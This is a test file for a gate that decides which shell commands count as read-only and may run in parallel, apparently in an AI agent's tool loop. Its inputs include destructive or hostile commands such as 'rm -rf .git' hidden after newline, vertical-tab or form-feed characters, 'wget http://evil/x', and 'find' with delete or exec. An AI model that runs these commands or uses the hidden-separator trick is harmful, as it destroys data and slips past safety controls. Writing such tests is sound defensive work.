// Batching-integrity regression: the parallel "pure read-only shell" group
// used to (a) miss newlines in its metacharacter class — a second line like
// `rm -rf x` hid behind a read-only first token and rode the CONCURRENT
// batch — and (b) allowlist `find`, whose `-delete`/`-exec … +` mutation
// forms evade the metachar class entirely. The contract (loop.ts): stateful
// commands go one at a time to preserve causal order. RED pre-fix: both
// commands returned true (parallel-eligible).
import { describe, it, expect } from 'vitest';
import { isPureReadOnlyShellCommand } from './loop.js';

describe('isPureReadOnlyShellCommand (parallel batch gate)', () => {
  it('accepts genuinely read-only commands', () => {
    expect(isPureReadOnlyShellCommand('ls -la')).toBe(true);
    expect(isPureReadOnlyShellCommand('cat foo.txt')).toBe(true);
    expect(isPureReadOnlyShellCommand('grep -rn TODO src')).toBe(true);
    expect(isPureReadOnlyShellCommand('rg pattern .')).toBe(true);
  });

  it('rejects metacharacter state changes', () => {
    expect(isPureReadOnlyShellCommand('cat a.txt > b.txt')).toBe(false);
    expect(isPureReadOnlyShellCommand('ls && rm x')).toBe(false);
    expect(isPureReadOnlyShellCommand('cat $(whoami).txt')).toBe(false);
    expect(isPureReadOnlyShellCommand('cd /tmp && ls')).toBe(false);
  });

  it('rejects newline-hidden second commands (the bypass)', () => {
    expect(isPureReadOnlyShellCommand('cat foo.txt\nrm -rf .git')).toBe(false);
    expect(isPureReadOnlyShellCommand('pwd\nwget http://evil/x')).toBe(false);
  });

  it('rejects find and its mutation forms', () => {
    expect(isPureReadOnlyShellCommand('find . -name "*.log"')).toBe(false);
    expect(isPureReadOnlyShellCommand('find . -name "*.log" -delete')).toBe(false);
    expect(isPureReadOnlyShellCommand('find . -name x -exec rm {} +')).toBe(false);
  });

  it('rejects env — it executes arbitrary argv (review P1)', () => {
    expect(isPureReadOnlyShellCommand('env rm -rf .git')).toBe(false);
    expect(isPureReadOnlyShellCommand('env -i FOO=1 sh -c "echo hi"')).toBe(false);
    // printenv stays: it only prints.
    expect(isPureReadOnlyShellCommand('printenv HOME')).toBe(true);
  });

  it('rejects vertical-tab / form-feed hidden second commands (review P2)', () => {
    expect(isPureReadOnlyShellCommand('cat foo.txt\vrm -rf .git')).toBe(false);
    expect(isPureReadOnlyShellCommand('cat foo.txt\frm -rf .git')).toBe(false);
  });

  it('rejects empty commands', () => {
    expect(isPureReadOnlyShellCommand('')).toBe(false);
    expect(isPureReadOnlyShellCommand('   ')).toBe(false);
  });
});
